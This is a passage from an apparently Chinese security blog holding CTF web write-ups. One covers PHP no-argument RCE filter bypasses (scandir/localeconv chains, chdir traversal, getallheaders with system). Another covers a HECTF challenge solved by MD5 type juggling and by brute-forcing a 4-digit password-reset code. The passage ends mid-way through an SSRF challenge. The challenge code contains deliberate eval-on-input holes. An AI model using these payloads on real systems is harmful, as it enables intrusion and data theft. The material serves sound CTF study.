operator">.</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span> <span class="token comment">// 十六进制值</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>=<br>1<br>a<br></p></blockquote><h3 id="chdir"><a href="#chdir" class="headerlink" title="chdir()"></a>chdir()</h3><p><code>chdir()</code> 函数当参数为两个点的时候能够跳转到上层目录，相当于在命令行输入cd..会返回上一级目录。</p><p>DOS的Chdir（cd）命令可以显示当前目录的名称或者更改当前的目录。</p><p>一般当前显示的路径是”C:\Users\Administrator”，如果想要跳转到D盘的Test文件夹(“D:\test\”)可以直接使用DOS命令<strong>cd /d d:\test</strong></p><p>如果想要跳转到当前路径的上一级路径可以直接用DOS命令<strong>cd ..</strong></p><p>如果想要获取cd命令的具体用法，可以直接输入<strong>cd /?</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"app"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>D:\phpStudy\PHPTutorial\WWW<br>D:\phpStudy\PHPTutorial\WWW\app<br>D:\phpStudy\PHPTutorial\WWW</p></blockquote><h3 id="localtime"><a href="#localtime" class="headerlink" title="localtime()"></a>localtime()</h3><pre class="line-numbers language-none"><code class="language-none">localtime(timestamp,is_assoc);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>timestamp</em></td><td align="left">可选。规定 Unix 时间戳。如果未规定 <em>timestamp</em>，则默认为当前的本地时间 time()。</td></tr><tr><td align="left"><em>is_assoc</em></td><td align="left">可选。规定返回关联数组还是索引数组。如果为 FALSE，则返回索引数组。如果为 TRUE，则返回关联数组。默认为 FALSE。关联数组的键名如下：[tm_sec] - 秒数[tm_min] - 分钟数[tm_hour] - 小时[tm_mday] - 月份中的第几天[tm_mon] - 年份中的第几个月，从 0 开始表示一月份[tm_year] - 年份，从 1900 开始[tm_wday] - 星期中的第几天 (Sunday=0)[tm_yday] - 年中的第几天[tm_isdst] - 夏令时当前是否生效</td></tr></tbody></table><br><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s1.ax1x.com/2020/07/19/UfZFsK.png"></p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>可以利用<code>eval()</code>读取目录</p><ul><li>用scandir()读取目录源码，但必须带有参数（’.’），无法通过正则匹配</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://s1.ax1x.com/2020/07/20/UflsPO.png"></p><ul><li>用pos()取localeconv()返回的数组的第一个元素，也就是”.”</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">pos</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://s1.ax1x.com/2020/07/20/Ufloi8.png"></p><p><code>code.php?code=var_dump(scandir(pos(localeconv())));</code></p><p><img src="https://s1.ax1x.com/2020/07/20/Uflvd0.png"></p><ul><li>用end()选择最后一个文件并用readfile()读取</li></ul><p><code>code.php?code=var_dump(readfile(end(scandir(pos(localeconv())))));</code></p><blockquote><p>readfile()   输出一个文件</p><p>show_source() 与 echo(readfile())效果一样，可代替使用。</p></blockquote><p><img src="https://s1.ax1x.com/2020/07/20/Uf1kLR.png"></p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>利用当前秒数构造点  ，利用localtime()中返回的秒数来构造点，点的aiisc码正好是46在60秒之内，我们只需等到46秒时候就能将点给构造出来。</p><ul><li>chr(current(localtime(time())))</li></ul><p>利用chr(46)就是字符<code>.</code></p><p>数组第一个值每秒+1，所以最多60秒就一定能得到46</p><pre class="line-numbers language-none"><code class="language-none">var_dump(chr(pos(localtime())));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最终payload</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;39.107.126.173:8080&#x2F;code&#x2F;code.php? code&#x3D;var_dump(readfile(end(scandir(chr(pos(localtime()))))));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>利用SESSIONID来传参</p><pre class="line-numbers language-none"><code class="language-none">show_source(session_id(session_start()));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在cookie处传参</p><pre class="line-numbers language-none"><code class="language-none">PHPSESSID&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s1.ax1x.com/2020/07/20/Uf1UfS.png"></p><p><img src="https://s1.ax1x.com/2020/07/20/U4hJsS.png"></p><h3 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h3><p>利用 getallheaders() 来获取参数RCE</p><pre class="line-numbers language-none"><code class="language-none">echo(system(end(getallheaders()))); <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在最后在最后一条请求头添加</p><pre class="line-numbers language-none"><code class="language-none">cat flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s1.ax1x.com/2020/08/17/dZ78KO.png"></p><br><h2 id="读取目录文件"><a href="#读取目录文件" class="headerlink" title="读取目录文件"></a>读取目录文件</h2><ul><li>如果文件是最后一个，可以用</li></ul><p><code>show_source(end(scandir(getcwd())));</code></p><blockquote><p>或者用<code>readfile()</code>、<code>highlight_file()</code>、<code>file_get_contents()</code>、<code>readgzfile()</code>等读文件函数</p></blockquote><ul><li>如果文件是倒数第二个，可以用</li></ul><p><code>show_source(next(array_reverse(scandir(getcwd()))));</code></p><blockquote><p><code>array_reverse()</code>以相反的元素顺序返回数组</p></blockquote><ul><li>如果不是数组的最后一个或者倒数第二个，可以用</li></ul><p><code>show_source(array_rand(array_flip(scandir(getcwd()))));</code></p><p>或者：</p><p><code>show_source(array_rand(array_flip(scandir(current(localeconv())))));</code></p><blockquote><p><code>array_flip()</code>函数会交换数组的键名和键值，<code>array_rand()</code>函数会返回数组中的随机键名</p></blockquote><br><h2 id="跳转目录情况"><a href="#跳转目录情况" class="headerlink" title="跳转目录情况"></a>跳转目录情况</h2><ul><li><p>假设ﬂag在上层目录文件的情况，我们需要跳转到上层目录。 </p></li><li><p><code>chdir()</code> 函数当参数为两个点的时候能够跳转到上层目录。<code>scandir()</code> ，读取当前目录在第二个元素就能读取两个点</p></li><li><p><code>localtime</code>第一个参数是时间戳，所以我们不能直接嵌套，需要带一个time函数作为嵌套、time函数能够返回时间戳 </p></li><li><p>构造读取上层目录payload</p></li></ul><pre class="line-numbers language-none"><code class="language-none">echo(implode(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>构造读取上层目录文件payload</li></ul><pre class="line-numbers language-none"><code class="language-none">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h2 id="其它小技巧"><a href="#其它小技巧" class="headerlink" title="其它小技巧"></a>其它小技巧</h2><ul><li>利用chr(46)就是字符<code>.</code></li></ul><p>phpversion()会返回php版本，如<code>5.6.27</code></p><p><code>floor(phpversion())</code>返回<code>5</code></p><p><code>sqrt(floor(phpversion()))</code>返回<code>2.2360679774998</code></p><p><code>tan(floor(sqrt(floor(phpversion()))))</code>返回<code>-2.1850398632615</code></p><p><code>cosh(tan(floor(sqrt(floor(phpversion())))))</code>返回<code>4.5017381103491</code></p><p><code>sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))</code>返回<code>45.081318677156</code></p><p><code>ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</code>返回<code>46</code></p><p>即：<code>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))</code>等于<code>.</code></p><ul><li>利用三角函数构造斜杠</li></ul><pre class="line-numbers language-none"><code class="language-none">chr(floor(tan(tan(atan(atan(ord(cos(fclose(tmpfile())))))))));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>利用随机令牌构造点</li></ul><pre class="line-numbers language-none"><code class="language-none">echo(implode(scandir(chr(strrev(uniqid())))));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看上一级目录文件名</li></ul><pre class="line-numbers language-none"><code class="language-none">print_r(scandir(dirname(getcwd())));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">print_r(scandir(next(scandir(getcwd()))));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//flag in flag.php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ses|pos|end|next|name|chdir|var|impolode|tan|tall|sys|eval|var|high|show|read|base|url|print/i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\$a="</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h3><p>首先对传进来的code进行过滤，若是通过替换后为<code>;</code>，则能通过第一个if判断语句，所以要套娃嵌套</p><p>第二个if语句对危险函数进行过滤，包括大小写，所以只能用没被过滤的函数来构造payload</p><p>eval()语句执行传进来的code，然后赋值给<code>$a</code></p><p>第三个if语句对$a进行匹配，如果含有<code>flag</code>，则die掉</p><p>绕过了前面3个if语句，则通过echo($a)，将code执行后的结果输出</p><h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><p>用<code>file_get_contents()</code>将整个文件读入一个字符串，利用eval()赋值给$a，最后通过echo()打印出来</p><p>因为不知道flag.php的位置，且过滤掉很多函数，如：end()、next()等</p><p>所以用<code>array_rand(array_flip())</code>来获取一个随机的文件名</p><p>合起来就是</p><pre class="line-numbers language-none"><code class="language-none">file_get_contents(array_rand(array_flip(scandir(current(localeconv())))));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但后边对$a进行正则匹配，过滤了<code>flag</code>，所以要对读取的文件内容加密，由于过滤了base64，所以选择用十六进制加密，得到最终payload</p><pre class="line-numbers language-none"><code class="language-none">bin2hex(file_get_contents(array_rand(array_flip(scandir(current(localeconv()))))));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为是随机读取，所以要多刷新几次，然后解密看看</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"3c3f7068700d0a2f2f666c61677b36643633333362392d353564302d343266312d613236642d3663666439663361666238657d0d0a3f3e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><?php//flag{6d6333b9-55d0-42f1-a26d-6cfd9f3afb8e}?></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第四届HECTF write up</title>
      <link href="posts/20201122.html"/>
      <url>posts/20201122.html</url>
      
        <content type="html"><![CDATA[<p>web &amp; misc &amp; 复现</p><span id="more"></span><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><p>题目：蛾子！你怎么跑到了。。。。php上？</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$string_1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token variable">$string_2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$string_1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token variable">$md5_1</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$string_1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$md5_2</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$string_2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$md5_1</span> <span class="token operator">!=</span> <span class="token variable">$md5_2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">strtr</span><span class="token punctuation">(</span><span class="token variable">$md5_1</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cxhp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'0123'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">strtr</span><span class="token punctuation">(</span><span class="token variable">$md5_2</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cxhp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'0123'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">==</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'you are close'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>          <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md5 is wrong"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'str1 not number'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'you are wrong!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用md5()不能加密数组，加密数组会返回false，所以<code>param1</code>和<code>param2</code>传值为</p><pre class="line-numbers language-none"><code class="language-none">param1[]&#x3D;1&amp;param2[]&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下要使得传进来的<code>str1</code>是纯数字，且<code>str1</code>和<code>str2</code>进行md5加密后的值不相等</p><p>然后对md5加密后的值进行替换后相等，最终得到flag</p><br><p>只要是以0e开头，后面为数字的两个字符串相等，所以</p><p><code>$a == $b</code>这里可以考虑这样绕过</p><p>纯数字的字符串md5加密后符合**<code>0e\d+</code>**的有<code>240610708</code>，即</p><pre class="line-numbers language-none"><code class="language-none">str1&#x3D;240610708<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为在后面的替换中，会将<code>c</code>替换为<code>0</code>，所以<code>str2</code>进行md5加密后得以<code>ce</code>开头，这样才能使得<code>str1</code>和<code>str2</code>md5加密后的值不相等，替换后又能相等</p><p>而<code>str2</code>进行md5加密后，除开头的<code>ce</code>外，剩下部分只能是数字和字母cxhp</p><p>写脚本进行筛选</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">10000000</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'ce'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$end</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^0-9cxhp]/'</span><span class="token punctuation">,</span> <span class="token variable">$end</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"i="</span><span class="token operator">.</span><span class="token variable">$i</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"a="</span><span class="token operator">.</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">i&#x3D;9427417a&#x3D;ce156443c7c7c4c63366466c25317636<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>所以<code>str2=9427417</code></p><p>联合起来即</p><pre class="line-numbers language-none"><code class="language-none">?str1&#x3D;240610708&amp;str2&#x3D;9427417&amp;param1[]&#x3D;1&amp;param2[]&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s3.ax1x.com/2020/11/21/D3aJdU.png" alt="D3aJdU.png"></p><br><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>题目：登录就送flag~</p><p>hint：brute force</p><p><img src="https://s3.ax1x.com/2020/11/21/D3aDL6.png"></p><p>随便输个手机号和密码，提示手机或密码错误，查看源码发现手机号：<code>15970773575</code></p><p><img src="https://s3.ax1x.com/2020/11/21/D3ajln.png"></p><p>点击<code>忘记密码</code>，根据题目hint，使用暴力破解</p><p><img src="https://s3.ax1x.com/2020/11/21/D3dtnP.png"></p><p>用脚本生成4位纯数字的验证码</p><ul><li>4num.py</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'4num.txt'</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用burp suite抓包，使用爆破模块进行爆破，其中<code>0233</code>的长度和其它明显不同</p><p><img src="https://s3.ax1x.com/2020/11/21/D3dgBV.png"></p><p>尝试后发现为正确的验证码，重设密码后重新登录即可拿到flag</p><pre class="line-numbers language-none"><code class="language-none">HECTF&#123;a9a102c0c06fcf6c8072c30f0a52f1f2&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="ssrfme"><a href="#ssrfme" class="headerlink" title="ssrfme"></a>ssrfme</h3><p>题目：绕过人海，走进服务器内心的世界。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//try flag.php</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token variable">$match_result</span><span class="token operator">=</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^(http|https)?:\/\/.*(\/)?.*$/'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$match_result</span><span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'url fomat error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>     <span class="token keyword">try</span>     <span class="token punctuation">&#123;</span>         <span class="token variable">$url_parse</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token 